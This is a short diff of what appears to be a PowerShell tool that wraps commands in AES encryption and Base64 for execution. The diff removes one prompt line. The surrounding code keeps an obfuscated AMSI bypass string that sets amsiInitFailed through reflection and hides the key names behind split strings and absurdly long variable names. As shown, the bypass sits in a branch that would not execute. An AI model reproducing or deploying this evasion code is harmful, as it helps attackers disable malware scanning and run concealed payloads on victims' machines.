@@ -33,7 +33,6 @@ function $decryptFuncName{param(`$eCmd,`$k1,`$k2,`$k3,`$iv,`$reverse)`$AES=New-O
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($decryptCmd)
 $base64String = [System.Convert]::ToBase64String($bytes)
 
-Write-Host "To execute your command, copy and paste the following line:"
 $amsibp = " $tr=(555 -eq 555);$fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff='si';$fffffffffffffffffffffffffffffffffffffffffffffffffffffff='Am';if(0 -ne 1) {} else{  $Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $fffffffffffffffffffffffffffffffffffffffffffffffffffffff,$fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)); $zero=$Ref.GetField(('am{0}InitFailed'-f $fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff),'NonPublic,Static');$zero.SetValue($null,$tr)}"
 Write-Host $base64String
 #Write-Host $decryptCmd
